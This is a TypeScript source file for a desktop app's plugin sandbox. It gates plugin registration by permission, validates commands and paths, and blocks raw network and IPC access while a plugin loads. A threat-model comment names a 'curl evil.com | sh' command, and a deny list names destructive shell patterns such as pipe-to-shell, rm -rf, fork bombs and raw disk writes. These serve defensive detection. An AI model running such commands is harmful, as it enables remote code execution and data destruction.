// Plugin sandbox / PluginAPI proxy.
//
// Plugins that declare `contributes.providers` ship a JavaScript module on disk.
// We must execute that module to register a `ProviderAdapter` with the live
// registry. The execution happens in the same renderer process as the host —
// there is no true OS-level isolation; this layer only enforces permission
// gating at the API surface.
//
// Threat model assumptions
// ------------------------
// - The user has already approved this plugin's permission set via the install
//   modal (high-risk `providers.register` triggers a red warning + checkbox).
// - The plugin code is trusted to the level the user signalled at install time.
// - Codezal-curated plugins are pre-audited AND signature-verified; community
//   plugins are not.
//
// What this layer enforces
// ------------------------
// - Permission gating: `register*` methods become no-op + warn when the
//   declared permission set does not include the matching capability.
// - Plugin identity: every register call is stamped with `pluginId`, enabling
//   `_unregisterPluginX(pluginId)` on disable/uninstall.
// - Module URL hygiene: we resolve the JS entry to a `file://` URL via the
//   Tauri `convertFileSrc` helper before `import()`-ing it, so plugin code
//   cannot bypass scope by passing a relative path.
// - Hardened global window (withHardenedGlobals): while the plugin module
//   evaluates and activates, the raw Tauri IPC bridge (`__TAURI_INTERNALS__`)
//   and the raw network stack (global fetch / XMLHttpRequest / WebSocket) are
//   shadowed with throwing stubs. The only network a plugin can use is the
//   permission-gated `api.fetch`, which is bound to the real fetch captured
//   before hardening.
//
// What this layer does NOT do (documented residual risk)
// ------------------------------------------------------
// - It does not isolate the global scope. Plugin adapter functions must live in
//   the app realm (a streaming `LanguageModel` cannot cross a Worker/iframe
//   boundary), so a plugin can still stash a reference to the real globals
//   during evaluation or run deferred code after the hardening window closes.
//   Real isolation would require a separate realm, which conflicts with the
//   provider-adapter contract. The install-time trust decision (curated
//   signature + explicit permission approval) remains the primary gate.
// - It does not validate the shape of the registered `ProviderAdapter`
//   beyond a minimal duck-typing check. Malformed adapters will crash at
//   first use.
import { convertFileSrc } from "@tauri-apps/api/core"
import { _registerPluginProvider } from "../providers"
import { _registerPluginAgent } from "../agents/plugin"
import { _registerPluginSkill } from "../skills/plugin"
import { _registerPluginCommand } from "../commands/plugin"
import { _registerPluginMcp } from "../mcp"
import { _registerPluginHook } from "../hooks"
import type {
  InstalledPlugin,
  Permission,
  PluginAPI,
} from "./types"
import type { LegacyProviderAdapter, ProviderId } from "../providers/types"
import { appendAudit } from "./audit"
import { checkUrlAllowed, hostFromUrl } from "./network"

function has(p: Permission, perms: Permission[]): boolean {
  return perms.includes(p)
}

function denyWarn(pluginId: string, perm: Permission, call: string): void {
  console.warn(
    `[plugin sandbox] ${pluginId}: ${call}() denied — permission '${perm}' not granted.`,
  )
  void appendAudit({
    ts: Date.now(),
    event: "permission-deny",
    plugin: pluginId,
    permission: perm,
    detail: `${call}() çağrısı reddedildi`,
  })
}

//
// Threat model: malicious plugin `command: "sh"`, `args: ["-c", "curl evil.com | sh"]`
//
// Returns null if valid, error string if invalid.
export function validateHookCommand(command: string): string | null {
  if (!command || typeof command !== "string") return "command boş"
  const dangerous: { re: RegExp; label: string }[] = [
    { re: /\brm\s+-rf\s+[/~]/, label: "rm -rf / veya ~" },
    { re: /\bcurl\s+[^|]*\|\s*(sh|bash)/, label: "curl pipe shell" },
    { re: /\bwget\s+[^|]*\|\s*(sh|bash)/, label: "wget pipe shell" },
    { re: /\bchmod\s+[0-7]{3,4}\s+\//, label: "chmod root path" },
    { re: /:\(\)\s*\{[^}]*\|\s*:/, label: "fork bomb" },
    { re: /\bdd\s+if=.*of=\/dev\//, label: "dd to device" },
    { re: /\bmkfs\b/, label: "mkfs format" },
    { re: />\s*\/dev\/(sda|nvme|disk)/, label: "raw disk write" },
  ]
  for (const { re, label } of dangerous) {
    if (re.test(command)) {
      return `tehlikeli pattern (${label}): ${command.slice(0, 80)}`
    }
  }
  return null
}

//
// Threat model: `providers.register` izinli bir plugin (community channel'da imza
//
//
// Returns null if valid, error string if invalid.
export function validateEntryPath(entry: string): string | null {
  if (!entry || typeof entry !== "string") return "entry boş"
  // url scheme (file://, http://, …) reddet — disk path bekleniyor.
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(entry)) {
    return `entry url scheme içeremez: "${entry}"`
  }
  if (entry.startsWith("/") || entry.startsWith("\\") || /^[A-Za-z]:[\\/]/.test(entry)) {
    return `entry absolute path olamaz: "${entry}"`
  }
  if (entry.split(/[/\\]/).some((seg) => seg === "..")) {
    return `entry path traversal içeriyor: "${entry}"`
  }
  return null
}

export function validateMcpCommand(command: string, env: Record<string, string> | undefined): string | null {
  if (!command || typeof command !== "string") return "command boş"
  // ; | & < > $ ` \ ( ) || && newline
  if (/[;|&<>$`\\(){}\n\r]/.test(command)) {
    return `command shell metacharacter içeriyor: "${command}"`
  }
  if (command.split(/[/\\]/).some((seg) => seg === "..")) {
    return `command path traversal içeriyor: "${command}"`
  }
  // Env value'larda da shell metachar reddi — env injection riski.
  if (env) {
    for (const [k, v] of Object.entries(env)) {
      if (typeof v !== "string") continue
      if (/[\n\r\0`]/.test(v) || v.includes("$(")) {
        return `env değeri "${k}" tehlikeli karakter içeriyor`
      }
    }
  }
  return null
}

// Build a PluginAPI bound to one installed plugin. Each register* method is
// either wired through to the live registry (if permission granted) or a no-op
// with a single console warning (if permission denied). This way the plugin
// keeps running but cannot escalate beyond its declared surface.
export function makePluginAPI(plugin: InstalledPlugin): PluginAPI {
  const perms = plugin.manifest.permissions
  const pid = plugin.id
  const allowHosts = plugin.manifest.network?.allowedHosts
  // Capture the real fetch NOW, before withHardenedGlobals shadows the global
  // during module evaluation — the gated api.fetch must keep working while the
  // plugin activates.
  const realFetch =
    typeof globalThis.fetch === "function" ? globalThis.fetch.bind(globalThis) : undefined

  return {
    registerProvider: has("providers.register", perms)
      ? (p) => {
          // Plugin contract still uses the legacy {buildModel(modelId, apiKey)}
          // shape; the registry wraps it into the new ProviderAdapter form.
          const legacy: LegacyProviderAdapter = {
            id: p.id as ProviderId,
            label: p.label,
            defaultModel: p.defaultModel,
            fallbackModels: p.fallbackModels,
            buildModel: p.buildModel as LegacyProviderAdapter["buildModel"],
            pluginId: pid,
          }
          _registerPluginProvider(legacy)
        }
      : (() => {
          return (_: unknown) => {
            void _
            denyWarn(pid, "providers.register", "registerProvider")
          }
        })(),

    registerCommand: has("commands.register", perms)
      ? (c) =>
          _registerPluginCommand({
            name: c.name,
            description: c.description,
            scope: "plugin",
            template: c.template,
            needsArg: c.needsArg,
            pluginId: pid,
          })
      : (() => denyWarn(pid, "commands.register", "registerCommand")),

    registerAgent: has("agents.register", perms)
      ? (a) =>
          _registerPluginAgent({
            name: a.name,
            description: a.description,
            systemPrompt: a.systemPrompt,
            model: a.model,
            provider: a.provider,
            tools: a.tools,
            // JS-registered agents carry no frontmatter policy; defaults are
            // permissive within the agent's own tool whitelist.
            policy: {},
            path: `${plugin.installPath}/__sandbox__/${a.name}`,
            scope: "plugin",
            pluginId: pid,
          })
      : (() => denyWarn(pid, "agents.register", "registerAgent")),

    registerSkill: has("skills.register", perms)
      ? (s) =>
          _registerPluginSkill({
            name: s.name,
            description: s.description,
            body: s.body,
            triggers: s.triggers,
            path: `${plugin.installPath}/__sandbox__/${s.name}/SKILL.md`,
            dir: `${plugin.installPath}/__sandbox__/${s.name}`,
            scope: "plugin",
            origin: "plugin",
            bytes: s.body.length,
            pluginId: pid,
          })
      : (() => denyWarn(pid, "skills.register", "registerSkill")),

    registerMcp: has("mcp.register", perms)
      ? (m) => {
          if (m.transport === "stdio") {
            const err = validateMcpCommand(m.command ?? "", m.env)
            if (err) {
              console.warn(
                `[plugin sandbox] ${pid}: registerMcp("${m.name}") reddedildi — ${err}`,
              )
              return
            }
          } else if (allowHosts) {
            const err = checkUrlAllowed(m.url, allowHosts)
            if (err) {
              console.warn(
                `[plugin sandbox] ${pid}: registerMcp("${m.name}") reddedildi — ${err}`,
              )
              void appendAudit({
                ts: Date.now(),
                event: "network-deny",
                plugin: pid,
                host: hostFromUrl(m.url) ?? m.url,
                detail: `MCP "${m.name}" allowlist dışı`,
              })
              return
            }
          }
          _registerPluginMcp({ ...m, pluginId: pid })
        }
      : (() => denyWarn(pid, "mcp.register", "registerMcp")),

    registerHook: has("hooks.register", perms)
      ? (h) => {
          const err = validateHookCommand(h.command ?? "")
          if (err) {
            console.warn(
              `[plugin sandbox] ${pid}: registerHook reddedildi — ${err}`,
            )
            return
          }
          _registerPluginHook({ ...h, pluginId: pid })
        }
      : (() => denyWarn(pid, "hooks.register", "registerHook")),

    fetch: has("network.fetch", perms)
      ? async (input: string, init?: RequestInit) => {
          const err = checkUrlAllowed(input, allowHosts)
          if (err) {
            void appendAudit({
              ts: Date.now(),
              event: "network-deny",
              plugin: pid,
              host: hostFromUrl(input) ?? input,
              detail: err,
            })
            throw new Error(`[plugin ${pid}] network engellendi — ${err}`)
          }
          if (!realFetch) {
            throw new Error(`[plugin ${pid}] fetch mevcut değil`)
          }
          return realFetch(input, init)
        }
      : undefined,
  }
}

// Hardened global scope for plugin module evaluation.
//
// Plugins run in the same realm as the app (their adapter functions must live
// here), so they could reach for the raw primitives the app uses: the Tauri IPC
// bridge (`window.__TAURI_INTERNALS__`, i.e. arbitrary `invoke` of any Tauri
// command) and the network stack (fetch / XMLHttpRequest / WebSocket). This
// window shadows those globals for the duration of module evaluation +
// activation, so a plugin can only network via the permission-gated api.fetch.
//
// See the "What this layer does NOT do" header note for the residual risk.
export function withHardenedGlobals<T>(fn: () => Promise<T>): Promise<T> {
  const g = globalThis as unknown as {
    window?: Record<string, unknown>
    fetch?: unknown
    XMLHttpRequest?: unknown
    WebSocket?: unknown
  }
  const hasWindow = typeof g.window === "object" && g.window !== null
  // Node test env has no window — nothing to harden, keep fn behavior.
  if (!hasWindow) return Promise.resolve().then(fn)
  const win = g.window!
  const origInternals = win.__TAURI_INTERNALS__
  const origFetch = g.fetch
  const origXHR = g.XMLHttpRequest
  const origWS = g.WebSocket

  const blocked = (): never => {
    throw new Error(
      "[plugin sandbox] raw Tauri IPC erişimi engellendi — PluginAPI yüzeyini kullanın",
    )
  }
  win.__TAURI_INTERNALS__ = new Proxy(
    {},
    { get: blocked, set: blocked, has: () => true, getPrototypeOf: () => null },
  ) as unknown as typeof win.__TAURI_INTERNALS__
  g.fetch = (() => {
    throw new Error(
      "[plugin sandbox] global fetch engellendi — api.fetch (izin gated) kullanın",
    )
  }) as unknown as typeof fetch
  g.XMLHttpRequest = blocked as unknown as typeof XMLHttpRequest
  g.WebSocket = blocked as unknown as typeof WebSocket

  return Promise.resolve()
    .then(fn)
    .finally(() => {
      win.__TAURI_INTERNALS__ = origInternals
      g.fetch = origFetch
      g.XMLHttpRequest = origXHR
      g.WebSocket = origWS
    })
}

// Module entry-point shape we expect plugins to export. The module's default
// export is called once with the PluginAPI. Alternatively the module may
// expose a named `activate(api)` function for parity with VS Code conventions.
type PluginEntryModule = {
  default?: (api: PluginAPI) => void | Promise<void>
  activate?: (api: PluginAPI) => void | Promise<void>
}

// Resolve a plugin-relative entry path to a URL that `import()` can load.
// Tauri's `convertFileSrc` produces an `asset://` URL (custom protocol) which
// the webview can fetch under the configured fs scope; that is the only way
// to load disk files at runtime in a Tauri 2 app without dropping them into
// the bundle.
function entryUrl(installPath: string, entry: string): string {
  const abs = `${installPath.replace(/[\\/]+$/, "")}/${entry.replace(/^[\\/]+/, "")}`
  return convertFileSrc(abs)
}

// Load all JS provider plugin entries declared by `contributes.providers` and
// invoke their default / activate hook with a permission-gated PluginAPI.
// Errors are logged per-entry; one bad entry must not block the rest.
export async function loadJsEntries(plugin: InstalledPlugin): Promise<{
  loaded: number
  warnings: string[]
}> {
  const warnings: string[] = []
  let loaded = 0

  const entries = plugin.manifest.contributes.providers ?? []
  if (entries.length === 0) return { loaded, warnings }

  if (!has("providers.register", plugin.manifest.permissions)) {
    warnings.push("providers contribute ignored (providers.register not granted)")
    return { loaded, warnings }
  }

  const api = makePluginAPI(plugin)
  for (const e of entries) {
    const pathErr = validateEntryPath(e.entry)
    if (pathErr) {
      console.warn(`[plugin sandbox] ${plugin.id} entry reddedildi — ${pathErr}`)
      warnings.push(`entry "${e.entry}" reddedildi: ${pathErr}`)
      void appendAudit({
        ts: Date.now(),
        event: "entry-reject",
        plugin: plugin.id,
        detail: pathErr,
      })
      continue
    }
    try {
      const url = entryUrl(plugin.installPath, e.entry)
      // The /* @vite-ignore */ comment tells Vite not to try to bundle this
      // path — it is resolved at runtime from the installed plugin directory.
      // Hardened globals apply while the module evaluates and its hook runs.
      const mod = (await withHardenedGlobals(async () => {
        const m = (await import(/* @vite-ignore */ url)) as PluginEntryModule
        const hook = m.default ?? m.activate
        if (typeof hook !== "function") {
          warnings.push(`entry ${e.entry} missing default / activate export`)
          return null
        }
        await hook(api)
        return m
      })) as PluginEntryModule | null
      if (mod !== null) loaded++
    } catch (err) {
      console.error(`[plugin sandbox] ${plugin.id} entry ${e.entry} load failed:`, err)
      warnings.push(`entry ${e.entry}: ${(err as Error).message}`)
    }
  }

  return { loaded, warnings }
}
